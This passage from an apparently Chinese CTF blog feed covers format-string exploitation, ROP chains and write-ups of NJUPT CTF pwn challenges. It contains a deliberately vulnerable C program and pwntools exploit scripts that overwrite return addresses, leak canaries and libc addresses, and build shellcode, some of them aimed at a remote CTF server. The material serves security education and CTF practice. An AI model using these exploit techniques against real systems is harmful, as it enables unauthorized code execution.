<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">int</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
   <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">char</span> ch<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
   <span class="token keyword">while</span> <span class="token punctuation">(</span>ch<span class="token operator">!=</span><span class="token string">'0'</span><span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
      <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"-------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"choice:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1.read\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2.printf\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0.exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span> <span class="token string">"-------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     ch<span class="token operator">=</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token string">'1'</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
          <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token string">'2'</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
          <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>

  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span></code></pre>
<p>编译请关闭PIE保护</p>
</blockquote>
<p>因为格式化字符串中有一个<code>%n</code>的东西 所以这个漏洞的地位就直接上升了一个档次 也就是无视栈不可执行和栈溢出保护 而直接修改返回地址</p>
<p>同上个模块一样 首先我们还是要算出格式化字符串相对于返回地址 在栈中的偏移 首先可以通过程序直接测出程序内部格式化字符串的偏移8个参数</p>
<p>首先需要明确一点的是 如果需要修改返回地址 就需要获得起码一个指向返回地址的指针 听起来可能有点绕 换种说法来讲就是 需要一个地址 那个地址里存放的是返回地址的值(也就是返回地址的老家23333) </p>
<p>那么通过动态调试 我们发现有一个指针</p>
<p><img src="https://ftp.bmp.ovh/imgs/2019/12/719cfd99297b2f41.png" alt></p>
<p>该指针指向的地址一直和返回地址的差0xE0 也就是说 我们可以先获取到该指针的值 然后减去0XE0 就可以得到指向返回地址的指针 然后通过该指针就可以修改返回地址的值了</p>
<blockquote>
<p>这里介绍一个pwntools很好用的模块 <code>fmtstr_payload</code></p>
<p>这个模块可以帮助我们半自动化的完成格式化字符串修改值的payload</p>
<p>使用语法为<code>fmtstr_payload(offset,{addr:value},numbwritten,write_size)</code></p>
<blockquote>
<p>offset为在栈中的偏移<br>{addr:value}分别对应需要修改的地址和修改后的值<br>numbwritten为在该payload前输出的字符数<br>write_size为修改时以何种方式修改 byte是hhn方式 short是hn方式 int是n方式</p>
</blockquote>
</blockquote>
<p>那么 我们就可以根据<code>fmtsrt_payload</code>模块 可以很快速的写出需要的脚本 脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./format3"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'%20$p'</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
p_ret<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xe0</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"p_ret:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>p_ret<span class="token punctuation">)</span><span class="token punctuation">)</span>
shell_addr<span class="token operator">=</span><span class="token number">0x4007f9</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"shell_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
payload2<span class="token operator">=</span>fmtstr_payload<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token punctuation">{</span>p_ret<span class="token punctuation">:</span>shell_addr<span class="token punctuation">}</span><span class="token punctuation">,</span>numbwritten<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>但是 我们上面的案例全部都是依赖于没有开启PIE保护的案例的 那么格式化字符串遇到PIE保护就无力了么??</p>
<h2 id="利用格式化字符串漏洞绕过PIE保护的思路"><a href="#利用格式化字符串漏洞绕过PIE保护的思路" class="headerlink" title="利用格式化字符串漏洞绕过PIE保护的思路"></a>利用格式化字符串漏洞绕过PIE保护的思路</h2><p>其实本模块的重心已经不再是格式化字符串漏洞了 准确的来说 我们不能单单利用格式化字符串漏洞去绕过PIE了 而是基于格式化字符串漏洞能泄露栈上数据的特性 来泄露出我们需要的数据 </p>
<p>利用格式化字符串漏洞泄漏信息的目标主要就是那些具有<code>代表性</code>的地址 例如</p>
<p><code>push r15</code>的地址可以泄露出程序加载的基地址</p>
<p><code>__libc_start_main+x</code>可以泄露出Libc的基地址</p>
<p><code>got.plt</code>同样可以泄露出Libc的基地址</p>
<p>总体来说 格式化字符串漏洞在绕过PIE的时候就仅仅是个工具人了..用完就扔..相当于绕过PIE的起手式 如果有其他手段泄漏信息的 格式化字符串漏洞也就是可有可无的地位了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>格式化字符串漏洞危害虽大 但是在现在真正的程序当中几乎不存在了 也就是在CTF比赛中可以偶尔一见 主要就是利用各种格式化字符串 其中<code>%n</code>最为重要 可以修改制定地址的值 其余的格式化字符串都可以用于信息泄露 利用格式化字符串直接Getshell 难度较大(其实是麻烦) 主要的用途还是关键信息泄露 注意思路不要跑偏即可</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NJUPT_CTF-WP]]></title>
      <url>/2019/11/28/njupt-ctf/</url>
      <content type="html"><![CDATA[<html><head></head><body><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>提示 <code>Do you know pwntools?</code> 直接用pwntools 连上去就出flag</p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/bcfa23648c0d59da32c0ba8b6cdabb1b" alt></p>
<h2 id="pwn-me-100-years-I"><a href="#pwn-me-100-years-I" class="headerlink" title="pwn_me_100_years (I)"></a>pwn_me_100_years (I)</h2><p>查保护</p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/8b83de84ae8ec07b01a461bfc7746ceb" alt></p>
<p>拖入IDA </p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/fd12eb6966aaf380b23c0e35c74436b3" alt></p>
<p>简单解释下逻辑 就是当0x6010c0地址处的值等于0x66666666时 程序将打开一个shell 程序前面只有一个read 双击s1 发现s1是和0x6010c0相邻 </p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/b545d90d71a0962f0619621cd50ffbe2" alt></p>
<p>可以观察到 s1到达目标0x6010c0只差0x10 而read可以读进0x20个字符 则我们可以覆盖过去 但是程序将我们输入的字符和<code>yes</code>进行了比较 如果等于yes 才能程序才会继续进行判断 但是strcmp函数判断字符串的方式是通过字符串结尾的\x00 来判断字符串是否结尾的 那手动输入一个\x00 让strcmp认为字符串结束就可以绕过了</p>
<p>脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"139.129.76.65"</span><span class="token punctuation">,</span><span class="token string">"50004"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"are you ready?"</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">'yes'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'ffff'</span><span class="token operator">*</span><span class="token number">5</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行即可getshell</p>
<p><img src="https://img04.sogoucdn.com/app/a/100520146/a10722822f0bbdb83531695cc2cb811f" alt></p>
<h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm_up"></a>warm_up</h2><p>查保护</p>
<p><img src="https://img04.sogoucdn.com/app/a/100520146/638a24772c7f4f3ef3f36972c873eaca" alt></p>
<p>载入IDA 发现程序加了白名单 禁止掉了execve 那肯定就不能开个shell了 只能使用orw[open,read,write] 来读取flag了 </p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/68b021fd58cf57e6109016f479acacef" alt></p>
<p>这里明显存在栈溢出 那么就是正常rop的流程 肯定还是要先泄漏出来canary的值和libc版本 然后使用mprotect函数 使bss段可执行 再将open(“./flag”) read(3,bss_addr,0x100) write(1,bss_addr,0x100) 写到bss段上 最后跳转执行即可 脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span>  pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true"># sh=remote("139.129.76.65","50007")</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./warm_up"</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"libc6_2.27-3ubuntu1_amd64.so"</span><span class="token punctuation">)</span>
file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./warm_up"</span><span class="token punctuation">)</span>
puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
read_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
main_addr<span class="token operator">=</span><span class="token number">0x400ab6</span>
pop_rdi_addr<span class="token operator">=</span><span class="token number">0x0000000000400bc3</span>
bss_addr<span class="token operator">=</span><span class="token number">0x000000000601000</span><span class="token operator">+</span><span class="token number">0x300</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"warm up!!!"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>
canary<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'canary:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span>
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># sh.interactive()</span>
puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
bin_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bin_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
open_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'open_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
write_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"write_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
read_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"read_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
mprotect<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"mprotect:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>mprotect<span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"bss_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

pop_rdx_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x0000000000001b96</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"pop_rdx_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>pop_rdx_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
pop_rsi_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x0000000000023e6a</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"pop_rsi_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># sh.interactive()</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"warm up!!!"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"?"</span><span class="token punctuation">)</span>
payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1500</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span>
payload3<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>

read_flag<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"./flag"</span><span class="token punctuation">)</span>
read_flag<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
read_flag<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>bss_addr<span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>read_flag<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>即使使用了本地的libc版本依旧跑不通 很是郁闷</p>
<h2 id="pwn-me-100-years-II"><a href="#pwn-me-100-years-II" class="headerlink" title="pwn_me_100_years (II)"></a>pwn_me_100_years (II)</h2><p>有些问题 以后补上</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> WP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> WP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ROP技术]]></title>
      <url>/2019/11/16/rop-ji-zhu/</url>
      <content type="html"><![CDATA[<html><head></head><body><blockquote>
<p>学习ROP技术需要略微一点的plt和got表的知识以及汇编层面函数调用的知识</p>
</blockquote>
<h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>在编程过程中 有面向过程编程(POP) 有面向对象编程(OOP) 而在PWN中 有一种技术叫做面向返回编程 即ROP </p>
<p>ROP存在的价值就是 当我们不能直接利用返回地址Getshell的时候 我们可以通过一个ROP链 将Getshell时缺少的条件补全 或者拿到一些必要的信息</p>
<blockquote>
<p>例如 函数表内没有system 或者 程序内没有/bin/sh 这种尴尬的情况</p>
</blockquote>
<h2 id="实现ROP的条件"><a href="#实现ROP的条件" class="headerlink" title="实现ROP的条件"></a>实现ROP的条件</h2><p>ROP对程序执行次数没有要求 因为即使程序仅执行一次 我们依旧可以在ROP链中 将主函数的地址添加进去 让程序返回到主函数处 所以不要求程序执行次数 但是实现ROP最基本的要求就是程序存在栈溢出 即我们能溢出到函数返回地址的位置 </p>
<h2 id="通常ROP的思路"><a href="#通常ROP的思路" class="headerlink" title="通常ROP的思路"></a>通常ROP的思路</h2><p>通常来说ROP思路基本固定 主要是以下两种</p>
<p>1.puts_plt+main_addr+puts_got </p>
<p>(输出puts函数的真实地址 用于泄漏Libc 且最后返回主函数 达成二次利用 [仅适用32位程序] )</p>
<p>2.pop_rdi_addr+puts_got+puts_plt+main_addr</p>
<p>(作用同上 但是这个ROP链适用于64位程序)</p>
<p>其中的函数名是可以换的 直接替换成适合的函数即可</p>
<h2 id="样例-攻防世界-进阶区-pwn100"><a href="#样例-攻防世界-进阶区-pwn100" class="headerlink" title="样例(攻防世界-进阶区-pwn100)"></a>样例(攻防世界-进阶区-pwn100)</h2><p>首先万年雷同起手式</p>
<p><img src="https://ae01.alicdn.com/kf/H565de1b3314e48eca5841b813a4afb464.png" alt></p>
<p>拖入IDA 发现程序主要的逻辑就是读入200个字符 然后结束 发现在读入时存在栈溢出 程序仅执行一次且程序函数表没有system函数 此时考虑使用ROP</p>
<p><img src="https://ae01.alicdn.com/kf/H1fdd1e71e864469287ddbf46bf091747K.png" alt></p>
<p>通过观察函数表 发现程序使用过puts函数 决定使用puts函数作为基础 使用ROP技术</p>
<p>首先因为是64位程序 我们需要将参数puts_got给整到寄存器RDI中 这样才能正常调用 这是我使用的是ROPgadget 这个工具来查找适合的函数 </p>
<p><img src="https://ae01.alicdn.com/kf/H7408932667ab43bda5577052e025cb3at.png" alt></p>
<p>确定0x400763存在我们需要的函数 那么我们就可以直接构造我们需要的ROP链了</p>
<blockquote>
<p>填充字符+pop_rdi_addr+puts_got+puts_plt+main_addr</p>
</blockquote>
<p>给出脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#sh=remote("111.198.29.45","42072")</span>
file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"pwn100"</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc6_2.23-0ubuntu10_amd64.so"</span><span class="token punctuation">)</span>

puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
pop_addr<span class="token operator">=</span><span class="token number">0x0000000000400763</span>
read_addr<span class="token operator">=</span><span class="token number">0x40063D</span>

payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4006b8</span><span class="token punctuation">)</span>
